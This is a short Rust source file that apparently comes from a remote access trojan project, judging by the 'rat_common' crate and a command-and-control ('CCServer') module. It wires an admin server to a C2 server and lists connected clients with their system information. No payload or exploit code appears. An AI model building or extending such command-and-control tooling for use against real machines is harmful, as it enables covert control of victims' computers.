use std::net::{SocketAddr, SocketAddrV4};
use std::sync::Arc;

use rat_common::empty_module_impl;
use rat_common::framework::{ModuleImpl, ModuleState};
use rat_common::schema::SystemInfo;

use crate::config::Config;
use crate::modules::admin::AdminServer;
use crate::modules::cc::CCServer;

pub struct Server {
    _admin: Arc<AdminServer>,
    _cc: Arc<CCServer>,
    _state: Arc<ModuleState>,
}

impl Server {
    pub async fn bind(
        admin_addr: SocketAddrV4,
        cc_addr: SocketAddrV4,
        cc_config: Config,
    ) -> anyhow::Result<Arc<Self>> {
        let cc = CCServer::bind(cc_addr, cc_config).await?;
        Ok(Arc::new_cyclic(|this| {
            let admin = AdminServer::bind(this.clone(), admin_addr);
            Self {
                _admin: admin.clone(),
                _cc: cc.clone(),
                _state: ModuleState::new_with_submodules(vec![admin, cc]),
            }
        }))
    }

    pub async fn clients(&self) -> Vec<(SocketAddr, Option<SystemInfo>)> {
        self._cc.clients().await
    }

    pub async fn client(&self, addr: &SocketAddr) -> Option<Option<SystemInfo>> {
        self._cc.client(addr).await
    }
}

empty_module_impl!(Server, "Server", _state);
